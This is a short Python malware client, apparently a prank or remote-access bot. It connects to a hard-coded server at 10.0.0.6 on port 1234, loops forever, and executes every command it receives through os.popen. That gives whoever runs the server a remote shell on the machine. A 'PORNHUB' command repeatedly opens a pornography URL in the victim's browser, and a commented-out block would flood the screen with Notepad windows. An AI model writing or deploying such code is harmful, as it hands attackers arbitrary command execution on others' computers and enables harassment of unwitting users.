import socket
import os
import webbrowser

class Client:
    def __init__(self):
        self.host = '10.0.0.6'
        self.port = 1234
        self.server = socket.socket()

    def connect(self):
        self.server.connect((self.host,self.port))

    def send(self,text):
        self.server.send(text.encode('UTF-8'))

    def recv(self):
        self.msg = self.server.recv(1024)
        return self.msg.decode('UTF-8')

url = 'https://pornhub.com/gayporn'

class Operate:
    def __init__(self):
        self.serv = Client()
        self.serv.connect()
                         
    def hack(self):
        self.msg = self.serv.recv()
        if self.msg.split(' ')[0] == "PORNHUB":
            webbrowser.open(url, new=0, autoraise=True)
            webbrowser.open(url, new=0, autoraise=True)
            webbrowser.open(url, new=0, autoraise=True)
            webbrowser.open(url, new=0, autoraise=True)
            webbrowser.open(url, new=0, autoraise=True)
        else:
            os.popen(self.msg)
        self.serv.send('Pornhub has been opened!')  
      
       # self.msg = self.serv.recv()
       # if self.msg.split(' ')[0] == 'NOTE_BOMB':
            #Notepad Bomber
          #  for int in range(self.msg.split(' ')[1]):
           #     os.popen('notepad.exe')
      #  else:
         #   os.popen(self.msg)
        #self.serv.send('Command Done ! . . . ')  

run = True
                         
bot = Operate()                         
while run:
    bot.hack()
